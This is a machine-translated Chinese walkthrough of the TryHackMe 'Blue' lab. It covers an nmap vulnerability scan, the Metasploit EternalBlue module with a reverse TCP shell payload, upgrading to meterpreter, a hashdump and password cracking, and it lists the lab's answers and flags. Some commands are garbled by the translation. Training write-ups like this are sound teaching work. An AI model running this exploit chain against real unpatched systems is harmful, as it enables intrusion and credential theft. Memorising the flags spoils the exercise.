<html>
<head>
<title>Tryhackme Blue walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Tryhackme Blue演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-blue-walkthrough-b0ec9b60e563?source=collection_archive---------1-----------------------#2021-10-01">https://infosecwriteups.com/tryhackme-blue-walkthrough-b0ec9b60e563?source=collection_archive---------1-----------------------#2021-10-01</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="5dc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">作者:穆基兰·B</p><blockquote class="kl km kn"><p id="e12b" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">嗨，了不起的黑客们，我又带着另一个有趣的话题回来了。</p></blockquote><p id="9bf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，部署攻击箱或通过自己的机器运行。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi ks"><img src="../Images/c91aaa1bb2cf60f771f4f579a17b0466.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6jgxeqclyFa0Se-LB63N2w.png"/></div></div></figure><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi le"><img src="../Images/7c09e796f61380009922f01347058081.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*Wq642Ay__pYp07wzGkjrJw.png"/></div></figure><p id="8dff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后他们告诉的第一个任务是扫描机器的漏洞。</p><p id="f77e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他们给出的使用命令查找漏洞的提示</p><blockquote class="kl km kn"><p id="222c" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">命令:nmap -sV -vv —脚本vuln TARGET_IP </strong></p></blockquote><p id="66ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后扫描机器，显示机器中的漏洞列表。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi lf"><img src="../Images/671a78174d210e159d893c4bad3b16c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1298/format:webp/1*Ih15U-W7UJAi8OA8x6jr9Q.png"/></div></figure><blockquote class="kl km kn"><p id="a129" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">端口号在1000以下的开放端口有多少个？</strong></p></blockquote><p id="cc54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko">安:3 </em> </strong></p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi lg"><img src="../Images/9dc33c9285a0c8005d39b0dd673a95fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:862/format:webp/1*W_Y9DfPYuZ8ksJrV4xwpew.png"/></div></figure><blockquote class="kl km kn"><p id="9a8c" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">这台机器容易受到什么攻击？(以:ms的形式回答？？-?？？，例如:ms08–067)</strong></p></blockquote><p id="638e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko">回答:ms17–010</em></strong></p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/cc69e05d3e0dd70c815d8e1df46b2740.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*S8PMbO8_eGKOLQ1A6pbfTw.png"/></div></figure><p id="20b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后使用以下命令启动Metasploit</p><blockquote class="kl km kn"><p id="0223" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir"> $ msfconsole </strong></p><p id="7c37" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">找到我们将在机器上运行的利用代码。代码的完整路径是什么？(例如:利用/……..)</strong></p></blockquote><p id="7852" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="ko">Ans:exploit/windows/SMB/ms17 _ 010 _永恒之蓝</em> </strong></p><p id="ae60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">键入<strong class="jp ir"> <em class="ko">在msfconsole中使用exploit/windows/SMB/ms17 _ 010 _ eternal blue</em></strong></p><p id="1f76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后键入<strong class="jp ir"> show options，</strong>将显示RHOSTS和一些其他选项，如<strong class="jp ir"> SESSIONS </strong>我们必须启用它键入<strong class="jp ir"> set RHOSTS target-IP </strong>并</p><p id="63e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">设置会话1 </strong>，然后输入<strong class="jp ir">运行。</strong></p><blockquote class="kl km kn"><p id="a608" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">显示选项并设置一个所需的值。这个值的名称是什么？(提交时全部大写)</strong></p></blockquote><p id="bd55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko">安:罗斯特</em> </strong></p><blockquote class="kl km kn"><p id="f106" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">通常，按原样运行此漏洞利用就可以了；但是，为了学习，你应该在开发目标之前再做一件事。输入以下命令并按回车键:</strong></p></blockquote><p id="f742" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe li lj lk ll b"><strong class="jp ir"><em class="ko">set payload windows/x64/shell/reverse_tcp</em></strong></code></p><blockquote class="kl km kn"><p id="4bcc" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">确认漏洞利用已经正确运行。您可能需要按enter键，DOS shell才会出现。这个外壳的背景(CTRL + Z)。如果失败，您可能需要重新启动目标虚拟机。请尝试在目标重新启动之前再次运行它。</strong></p></blockquote><p id="c193" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行漏洞攻击后，您可以通过键入<strong class="jp ir"> shell </strong>命令进入shell</p><p id="7844" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">键入<strong class="jp ir">whoami</strong>它会发现它的管理员名称</p><p id="c3e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要从shell运行回<strong class="jp ir">meter preter</strong>type<strong class="jp ir"><em class="ko">Ctrl+z .</em></strong></p><p id="68c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它会询问后台会话1是/否键入<strong class="jp ir"> <em class="ko">是</em> </strong>返回到<strong class="jp ir"> <em class="ko"> meterpreter。</em> </strong></p><blockquote class="kl km kn"><p id="bd68" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">如果你还没有，背景之前获得的外壳(CTRL + Z)。在线研究如何在Metasploit中将shell转换为meterpreter shell。我们将使用的后置模块的名称是什么？(确切的路径，类似于我们之前选择的漏洞)</p></blockquote><p id="014f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">T3】Ans:post/multi/manage/shell _ to _ meter preterT5】</strong></p><blockquote class="kl km kn"><p id="f64a" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">选择此项(使用模块路径)。显示选项，我们需要更改什么选项？</strong></p></blockquote><p id="96fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko"> Ans:会话</em> </strong></p><p id="1383" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们希望post通过输入以下有效载荷来利用它</p><p id="d786" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko">使用post/multi/manage/shell _ to _ meter preter</em></strong></p><p id="2769" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">键入此有效载荷后，输入<strong class="jp ir"> <em class="ko">显示选项</em> </strong></p><p id="16f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启用<strong class="jp ir"> <em class="ko"> lhost </em> </strong>和<strong class="jp ir"> <em class="ko">会话</em> </strong></p><p id="8fd3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">键入<strong class="jp ir"> <em class="ko"> get-system </em> </strong>命令和<strong class="jp ir"> <em class="ko"> ps </em> </strong>命令并迁移进程id</p><p id="dc13" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">类型迁移<strong class="jp ir"> <em class="ko"> PROCESS_ID </em> </strong></p><blockquote class="kl km kn"><p id="5f50" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">在我们提升的meterpreter shell中，运行命令‘hash dump’。这将转储机器上的所有密码，只要我们有正确的权限这样做。非默认用户的名称是什么？</strong></p></blockquote><p id="8574" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">T43】安:乔恩T45】</strong></p><blockquote class="kl km kn"><p id="531e" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">把这个密码哈希复制到一个文件里，研究如何破解。被破解的密码是什么？</strong></p></blockquote><p id="491b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">T49】Ans:alqfna 22T51】</strong></p><p id="1a52" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一个任务是找到一些标志:</p><p id="d171" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里输入<strong class="jp ir"> <em class="ko"> find -f flag*。txt</em>T55】</strong></p><p id="7596" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以找到此任务的标志</p><blockquote class="kl km kn"><p id="19f5" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir"> Flag1？<em class="iq">这个标志可以在系统根目录下找到。</em>T59】</strong></p></blockquote><p id="26e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko"> Ans:标志{access_the_machine} </em> </strong></p><blockquote class="kl km kn"><p id="486d" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">*勘误表:Windows确实不喜欢这个标志的位置，偶尔可以删除。在某些情况下，可能需要终止/重新启动机器，并重新运行漏洞来查找此标志。然而，这种相对罕见的情况会发生。</strong></p></blockquote><p id="6f08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko">标志{ Sam _ database _ elevated _ access }</em></strong></p><blockquote class="kl km kn"><p id="19fe" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir"> flag3？这面旗帜可以在一个绝佳的地点找到。毕竟，管理员通常会保存一些非常有趣的东西。T73】</strong></p></blockquote><p id="cea5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko">标志{ admin _ documents _ can _ be _ valued }</em></strong></p><p id="1ff7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Thankyou了不起的黑客</strong></p></div></div>    
</body>
</html>